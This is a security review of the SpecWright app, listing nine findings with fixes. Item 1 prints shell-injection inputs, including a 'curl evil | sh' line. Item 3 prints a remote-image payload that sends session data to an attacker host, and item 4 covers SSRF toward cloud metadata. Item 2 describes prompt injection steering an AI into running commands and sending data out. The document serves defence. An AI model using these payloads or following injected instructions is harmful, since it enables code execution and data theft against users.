# Security review: action items (2026-11-26)

A review of where SpecWright can be abused: secrets, communication, command
execution, and AI-driven actions. Findings were checked in the code (branch
`feature/ui-refresh`); the review is partial: the last section lists what was
not reviewed.

Severity: **High** (exploitable by content the user does not control, with
real impact), **Medium** (exploitable with some setup, or leaks data),
**Low** (hardening).

## Action items

| # | Severity | Area | Item |
|---|---|---|---|
| 1 | High | Command execution | Command injection in flow "Run a command" steps |
| 2 | High | AI actions | Prompt injection drives real actions (bridge tools, chat tools) |
| 3 | Medium | Communication | Data leaks through remote images in rendered Markdown; no CSP |
| 4 | Medium | Communication | SSRF from `fetch_webpage` and the HTTP tool |
| 5 | Medium | Secrets | Child processes inherit the app's environment and tokens |
| 6 | Medium | Secrets | Secret masking matches exact text only |
| 7 | Medium | Communication | Dev server token: non-constant-time, in the URL, address not forced to loopback |
| 8 | Low | Secrets | Encryption key stored beside the data when no keychain is available |
| 9 | Low | Command execution | Option injection through npm tool arguments |

---

### 1. Command injection in "Run a command" steps (High)

- **Where:** `internal/core/flowrun_calls.go` `flowCommand` runs
  `/bin/sh -c <command>` (`cmd /C` on Windows). The command is
  `flow.Render(n.Expr, d)`: `{{inputs.x}}` and earlier steps' output are
  pasted into the shell text.
- **Why it matters:** approval (`checkFlowCommands`) covers the template only,
  never the filled-in values. An input such as `; curl evil | sh`, or output
  from an AI step or a fetched page, runs as a shell command with the user's
  rights.
- **Fix:**
  - Pass values as environment variables (`$SW_INPUT_X`) or stdin, never
    inside the command text; render only step-independent parts.
  - Or quote every substituted value for the shell (`'…'` with `'` escaped;
    `^`-escaping on Windows).
  - Refuse (or ask about) values containing shell metacharacters when quoting
    is not possible.
- **Test:** a flow whose input is `x; touch /tmp/pwned` must not create the
  file.

### 2. Prompt injection drives real actions (High)

- **Where:**
  - AI steps run with the local bridge (`internal/extension/bridge.go`), whose
    tools include `run_command` (a shell; `internal/builtin/exec.go`
    `runCommand`), `save_flow` and `run_flow`. Only an admin's machine policy
    (`disabledBuiltinTools`) turns `run_command` off.
  - Copilot without the permission plugin runs with `--allow-all-tools`
    (`internal/agent/copilot.go` `argsWith`).
  - Chat tools that call themselves read-only run without asking
    (`internal/core/chattools.go` `chatToolReadOnly`); a tool's read-only
    status comes from its own declared permissions, which AI-written tools
    can mis-declare.
- **Why it matters:** anything the AI reads (web pages, Confluence, files,
  chat data, tool output) can carry instructions that make it run commands,
  change flows or send data out.
- **Fix:**
  - Always ask the person before `run_command`, `save_flow` and `run_flow`
    calls the AI makes (or default `run_command` to off outside the
    Playground).
  - Never fall back to `--allow-all-tools`: without the plugin, deny shell and
    write.
  - Decide "read-only" from what a tool does (built-ins' own flag; project
    tools only when an admin or reviewer marked them), not its self-declared
    permissions.
  - Mark untrusted content in prompts ("data, not instructions") and keep it
    in fenced blocks.

### 3. Data leaks through remote images; no CSP (Medium)

- **Where:** `frontend/src/markdown.js` allows `![…](https://…)` images from
  any address in AI answers, run results and files. There is no
  Content-Security-Policy in `frontend/index.html`.
- **Why it matters:** an injected answer such as
  `![](https://attacker/?d=<session data>)` sends data out the moment it is
  shown. Raw HTML and `javascript:` links are already blocked.
- **Fix:**
  - Render remote images as links (or load them only on click); allow
    `data:image/` and workspace files.
  - Add a CSP: `default-src 'self'; img-src 'self' data: blob:;
    connect-src 'self'; frame-src 'self'; object-src 'none'`.

### 4. SSRF from `fetch_webpage` and the HTTP tool (Medium)

- **Where:** `internal/builtin/exec.go` (`fetch_webpage` accepts any http(s)
  address) and `internal/builtin/http.go` (plain http allowed to localhost).
- **Why it matters:** a steered AI can reach internal company services,
  `localhost` services and cloud metadata (`169.254.169.254`) from the
  user's machine and read the replies.
- **Fix:** resolve the host and refuse loopback, link-local, private and
  unique-local ranges (unless the user allows a host), check again on every
  redirect (`CheckRedirect`), and pin the resolved address for the request.

### 5. Child processes inherit the app's environment and tokens (Medium)

- **Where:** command steps use `append(os.Environ(), …)`
  (`flowCommand`); AI CLIs get the bridge token (`CODEGEN_BRIDGE_TOKEN`) and
  runner windows get `SPECWRIGHT_RUNNER_TOKEN` through the environment
  (`internal/core/runner.go`).
- **Why it matters:** an AI with shell access can read every variable the
  app was started with (cloud keys, tokens) and call the bridge with its
  token.
- **Fix:**
  - Give child processes an allowlisted environment (PATH, HOME, proxy and
    registry settings, the run's own variables) instead of `os.Environ()`.
  - Scope the bridge token to one run and one set of tools, expire it when
    the run ends, and refuse bridge calls from a run that is not active.

### 6. Secret masking matches exact text only (Medium)

- **Where:** `internal/store/store.go` `Redactor.String` replaces exact
  values.
- **Why it matters:** a tool that prints a secret base64-encoded, URL-encoded,
  hex-encoded or split across lines reaches results, history and the AI
  unmasked.
- **Fix:** also mask the common encodings of each registered value (base64
  with and without padding, URL, hex), and mask values that span a line
  break; keep secrets out of tool output where possible (pass them to tools
  only through their environment).

### 7. Dev server token (Medium, development only)

- **Where:** `devserver.go` compares the token with `!=` and accepts it as
  `?token=` in the URL; `-addr` can be set to a non-loopback address.
- **Fix:** compare in constant time (`subtle.ConstantTimeCompare`), accept the
  token only in the header (use a cookie or a one-time exchange for the event
  stream), and refuse non-loopback addresses.

### 8. Encryption key beside the data without a keychain (Low)

- **Where:** `internal/core/triggers.go` `triggerKey`: with no keychain, the
  key for trigger secrets and project secrets is a 0600 file in the app's
  folder.
- **Why it matters:** it only protects against copying the secrets file
  alone; any process running as the user can read both.
- **Fix:** say so in Settings › Secrets when the file fallback is in use, and
  offer a passphrase-derived key there (as Admin does with PBKDF2).

### 9. Option injection through npm tool arguments (Low)

- **Where:** `internal/extension/extension.go` `ExecInput` passes arguments
  to npm scripts as `--key=value`.
- **Fix:** end options with `--` before values, or refuse values that start
  with `-` for parameters that are not flags.

---

## Checked and fine

- Local servers listen on 127.0.0.1 only; the bridge requires a random
  bearer token compared in constant time.
- Tool commands are split into arguments with no shell, so tool argument
  values cannot inject shell syntax.
- HTML previews render in `sandbox=""` iframes (no scripts).
- Markdown escapes raw HTML; `javascript:`/`vbscript:`/`data:` links are
  blocked.
- Keychain writes pass values on stdin, not the command line.
- The admin signing key is encrypted with PBKDF2-SHA256 (600,000 iterations).
- Project and trigger secrets are encrypted with AES-GCM; values never return
  to the UI.
- Secret inputs, Chatflow secrets and stored secrets are masked in results,
  events and history (exact-match; see item 6).

## Not reviewed yet

- [ ] Managed-tool signature checks and the machine policy file (who can
      write it; trust of local keys).
- [ ] `duckdb_data_query`: connection strings, Kerberos files, S3 credentials.
- [ ] Copilot SDK auto-allow rules (`extension.AutoAllowCopilot`).
- [ ] Path traversal in file APIs (attachments, saves, previews, exports).
- [ ] What reaches logs and run history (beyond secret masking).
- [ ] Proxy and registry settings (credentials in URLs, TLS settings).
- [ ] Wails bindings exposed to the page (what any script in the window could
      call).

## Suggested order

1. Item 1 (command injection): small, high impact.
2. Item 2 (ask before bridge actions; no `--allow-all-tools` fallback).
3. Items 3 and 4 (images and CSP; SSRF guard).
4. Item 5 (environment allowlist, scoped bridge token).
5. Items 6–9, then the "not reviewed" list.
